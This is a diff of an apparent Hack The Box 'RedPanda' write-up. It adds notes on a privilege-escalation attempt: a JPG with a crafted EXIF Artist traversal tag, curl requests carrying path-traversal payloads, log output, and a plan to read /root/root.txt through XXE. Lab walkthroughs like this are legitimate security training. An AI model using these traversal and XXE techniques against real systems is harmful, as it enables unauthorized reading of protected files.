@@ -782,11 +782,45 @@ and after searching for 'greg',
 ### the next step
 
 it feels like the plan goes like this:
-  * stuff a path transversal link in `redpanda.log` that points to a `jpg` we control (base path `/opt/panda_search/src/main/resources/static`
-  * build a `jpg` in that location that has an `artist` exif tag that is also a path transversal (base path `/credits/ + #{artist} + _creds.xml`
+  * stuff a path traversal link in `redpanda.log` that points to a `jpg` we control (base path `/opt/panda_search/src/main/resources/static`
+  * build a `jpg` in that location that has an `artist` exif tag that is also a path traversal (base path `/credits/ + #{artist} + _creds.xml`
   * [fuzzier] use XXE to get `/root/root.txt`
  
 
+built [foo.jpg](foo.jpg)
+
+```
+$ meta_exif foo.jpg
+...
+JPEG APP1 (106 bytes):
+  ExifByteOrder = MM
+  + [IFD0 directory with 3 entries]
+  | 0)  Orientation = 1
+  | 1)  Artist = ../foo
+  | 2)  ExifOffset (SubDirectory) -->
+```
+
+and ran `$ curl http://redpanda.htb:8080/../../../../../home/woodenk/foo.jpg`, which led to
+
+
+```
+woodenk@redpanda:~$ tail -f /opt/panda_search/redpanda.log
+
+404||10.10.14.9||curl/7.74.0||/home/woodenk/foo.jpg
+404||10.10.14.9||curl/7.74.0||/error
+
+```
+
+but the path traversal didn't make it to the logs
+
+`$ curl http://redpanda.htb:8080/..././..././..././..././..././home/woodenk/foo.jpg`
+
+gets
+
+```
+404||10.10.14.9||curl/7.74.0||/.../.../.../.../.../home/woodenk/foo.jpg
+404||10.10.14.9||curl/7.74.0||/error
+```
 
 ## flag
 
